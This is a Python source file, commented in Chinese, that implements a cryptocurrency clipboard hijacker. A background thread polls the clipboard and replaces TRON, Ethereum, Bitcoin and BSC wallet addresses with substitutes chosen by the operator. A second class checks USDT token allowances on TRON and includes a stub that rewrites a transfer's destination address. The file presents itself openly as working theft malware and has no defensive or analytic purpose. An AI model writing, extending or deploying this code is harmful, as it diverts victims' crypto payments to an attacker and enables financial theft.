#!/usr/bin/env python3
"""钱包地址替换劫持"""
import re
import threading
import time
import requests
from typing import Optional, Callable, Dict
from dataclasses import dataclass

@dataclass
class WalletInfo:
    address: str
    chain: str
    balance: float
    usdt_balance: float
    last_tx: str
    is_contract: bool

class WalletHijacker:
    """钱包地址劫持替换"""

    def __init__(self):
        self.patterns = {
            'tron': r'T[1-9A-HJ-NP-Za-km-z]{33}',
            'eth': r'0x[a-fA-F0-9]{40}',
            'btc': r'[13][a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-z0-9]{39,59}',
            'bsc': r'0x[a-fA-F0-9]{40}',
        }
        self.replace_map = {}
        self.monitoring = False
        self.callback: Optional[Callable] = None
        self._thread = None

    def add_replacement(self, original: str, replacement: str):
        """添加替换规则"""
        self.replace_map[original.lower()] = replacement

    def detect_and_replace(self, text: str) -> tuple:
        """检测并替换钱包地址"""
        modified = text
        detected = []

        for chain, pattern in self.patterns.items():
            matches = re.finditer(pattern, text)
            for match in matches:
                original = match.group()
                detected.append({
                    'chain': chain,
                    'original': original,
                    'position': match.span()
                })

                replacement = self.replace_map.get(original.lower())
                if replacement:
                    modified = modified.replace(original, replacement)

        return modified, detected

    def start_monitor(self, callback=None):
        """启动剪切板监控替换"""
        if self.monitoring:
            return "已在运行"

        self.monitoring = True
        self.callback = callback

        def monitor():
            last_content = ""
            while self.monitoring:
                try:
                    import pyperclip
                    current = pyperclip.paste()

                    if current and current != last_content:
                        last_content = current
                        modified, detected = self.detect_and_replace(current)

                        if detected and modified != current:
                            pyperclip.copy(modified)
                            if self.callback:
                                self.callback({
                                    'original': current,
                                    'modified': modified,
                                    'detected': detected
                                })
                except Exception as e:
                    print(f"Monitor error: {e}")

                time.sleep(0.3)

        self._thread = threading.Thread(target=monitor, daemon=True)
        self._thread.start()
        return "钱包劫持已启动"

    def stop_monitor(self):
        self.monitoring = False
        return "已停止"

class USDTTransferInterceptor:
    """USDT 转账拦截"""

    def __init__(self):
        self.tron_api = "https://api.trongrid.io"
        self.intercepting = False

    def check_approval_risk(self, owner: str, spender: str, contract: str) -> dict:
        """检查授权风险"""
        url = f"{self.tron_api}/v1/contracts/{contract}/methods/allowance"
        payload = {
            "owner_address": owner,
            "spender_address": spender
        }

        try:
            resp = requests.post(url, json=payload, timeout=10)
            data = resp.json()
            allowance = int(data.get('constant_result', ['0'])[0], 16)

            return {
                'owner': owner,
                'spender': spender,
                'allowance': allowance / 1e6,
                'risk': 'HIGH' if allowance > 1e12 else 'MEDIUM' if allowance > 0 else 'LOW'
            }
        except Exception as e:
            return {'error': str(e)}

    def intercept_transfer(self, from_addr: str, to_addr: str, amount: float, replacement_addr: str = None) -> dict:
        """拦截并篡改转账"""
        if replacement_addr:
            to_addr = replacement_addr

        return {
            'original_to': to_addr,
            'modified_to': replacement_addr or to_addr,
            'amount': amount,
            'intercepted': replacement_addr is not None
        }
